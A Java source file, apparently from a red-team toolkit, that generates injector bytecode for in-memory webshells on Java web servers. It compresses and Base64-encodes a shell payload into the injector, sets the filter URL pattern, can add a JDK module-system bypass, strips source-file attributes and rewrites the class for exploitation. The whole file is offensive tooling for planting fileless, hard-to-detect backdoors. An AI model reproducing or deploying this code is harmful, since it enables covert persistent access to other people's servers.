package com.potato.potatotool.content.redTeam.memshell.factory;

import com.potato.potatotool.utils.data.GzipUtils;
import com.potato.potatotool.utils.data.StrUtils;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import com.potato.potatotool.content.redTeam.memshell.config.MemoryObj;
import com.potato.potatotool.content.redTeam.memshell.config.MemoryShellConstants;
import com.potato.potatotool.content.redTeam.memshell.util.ExpModifierUtil;
import com.potato.potatotool.content.redTeam.memshell.util.InjectorUtil;
import com.potato.potatotool.content.redTeam.memshell.util.JDKBypassUtil;
import com.potato.potatotool.content.redTeam.memshell.util.JavassistUtil;
import com.potato.potatotool.content.redTeam.memshell.util.UrlPatternUtil;
import javassist.CtConstructor;

/**
 * @author Potato
 * @date 2024/7/29 11:19
 */
public class InjectorFactory {
    @SuppressWarnings("unchecked")
    ClassPool CLASS_POOL = ClassPool.getDefault();

    public byte[] generateInjector(MemoryObj memoryObj) throws Exception {
        String injectorClassName = InjectorUtil.getInjectorClassName(memoryObj.getServerType(), memoryObj.getShellType());
        byte[] bytes = transformInjectorBytes(injectorClassName, memoryObj);
        memoryObj.setInjectorBytes(bytes);
        memoryObj.setInjectorBytesLength(bytes.length);
        return bytes;
    }

    /**
     * 生成注入器字节码方法
     * @param injectorClassName 注入器类名
     * @param memoryObj 配置信息
     * @return 生成的字节码
     * @throws Exception 抛出所有异常
     */
    private byte[] transformInjectorBytes(String injectorClassName, MemoryObj memoryObj) throws Exception {
        // 将注入生成器类路径添加到类池中
        CLASS_POOL.insertClassPath(new ClassClassPath(this.getClass()));
        CtClass ctClass = null;
        try {
            // 从类池中获取指定的类
            ctClass = CLASS_POOL.getCtClass(injectorClassName);
            // 设置类文件版本为Java 5
            ctClass.getClassFile().setVersionToJava5();

            // 将shell字节数组压缩并进行Base64编码
            byte[] shellBytes = memoryObj.getShellBytes();
            if (shellBytes == null || shellBytes.length == 0) {
                throw new IllegalStateException("Shell bytes are empty");
            }
            byte[] compressedShellBytes = GzipUtils.GzipGetCompressedData(shellBytes);
            if (compressedShellBytes == null || compressedShellBytes.length == 0) {
                throw new IllegalStateException("Compressed shell bytes are empty");
            }
            String base64EncodedShell = StrUtils.base64Encode(compressedShellBytes).replace(System.lineSeparator(), "");

            if (base64EncodedShell != null) {
                // 获取类中的getBase64String方法
                CtMethod getBase64StringMethod = ctClass.getDeclaredMethod("getBase64String");
                // 将base64字符串分割成指定长度的块
                String[] base64Chunks = splitIntoChunks(base64EncodedShell.replace(System.lineSeparator(), ""), 40000);
                StringBuilder base64StringBuilder = new StringBuilder();
                for (int i = 0; i < base64Chunks.length; i++) {
                    if (i > 0) {
                        base64StringBuilder.append("+");
                    }
                    base64StringBuilder.append("new String(").append(JavassistUtil.toJavaStringLiteral(base64Chunks[i])).append(")");
                }
                // 设置getBase64String方法体，返回拼接后的base64字符串
                getBase64StringMethod.setBody(String.format("{return %s;}", base64StringBuilder));
            }

            // 针对shell类型为Filter或WFHandlerMethod，单独设置URL模式
            if (isUrlPatternShellType(memoryObj.getShellType())) {
                CtMethod getUrlPatternMethod = ctClass.getDeclaredMethod("getUrlPattern");
                getUrlPatternMethod.setBody(JavassistUtil.returnStringBody(UrlPatternUtil.requireValidUrlPattern(memoryObj.getUrlPattern())));
            }

            // 设置shell类名
            if (memoryObj.getShellClassName() != null) {
                CtMethod getClassNameMethod = ctClass.getDeclaredMethod("getClassName");
                getClassNameMethod.setBody(JavassistUtil.returnStringBody(memoryObj.getShellClassName()));
            }

            if (memoryObj.isEnableBypassJDKModule()) {
                addBypassJDKModule(ctClass);
            }

            // 设置注入器类名
            JavassistUtil.setClassNameIfNotNull(ctClass, memoryObj.getInjectorClassName());
            // 移除源文件属性
            JavassistUtil.removeSourceFileAttribute(ctClass);
            // 修改字节码用于利用
            return new ExpModifierUtil(memoryObj, ctClass).modifyClassForExploit();
        } finally {
            if (ctClass != null) {
                ctClass.detach();
            }
        }
    }

    /**
     * 将字符串分割成指定长度的块
     * @param source 要分割的字符串
     * @param chunkSize 块大小
     * @return 分割后的字符串数组
     */
    private static String[] splitIntoChunks(String source, int chunkSize) {
        int numChunks = (int) Math.ceil(source.length() / (double) chunkSize);
        String[] chunks = new String[numChunks];
        char[] payload = source.toCharArray();
        int start = 0;

        for (int i = 0; i < numChunks; i++) {
            int length = Math.min(chunkSize, payload.length - start);
            chunks[i] = new String(payload, start, length);
            start += chunkSize;
        }

        return chunks;
    }

    private static boolean isUrlPatternShellType(String shellType) {
        return MemoryShellConstants.SHELLTYPE_FILTER.equalsIgnoreCase(shellType)
                || MemoryShellConstants.SHELLTYPE_JAKARTA_FILTER.equalsIgnoreCase(shellType)
                || MemoryShellConstants.SHELLTYPE_WFHANDLERMETHOD.equalsIgnoreCase(shellType);
    }

    private static void addBypassJDKModule(CtClass ctClass) throws Exception {
        JavassistUtil.addOrUpdateMethod(ctClass, "bypassJDKModule",
                "public void bypassJDKModule()" + JDKBypassUtil.bypassJDKModuleBody());
        CtConstructor[] constructors = ctClass.getDeclaredConstructors();
        if (constructors.length == 0) {
            throw new IllegalStateException("Injector constructor is missing: " + ctClass.getName());
        }
        CtConstructor constructor = constructors[0];
        constructor.setModifiers(javassist.Modifier.setPublic(constructor.getModifiers()));
        constructor.insertBeforeBody("bypassJDKModule();");
    }

}
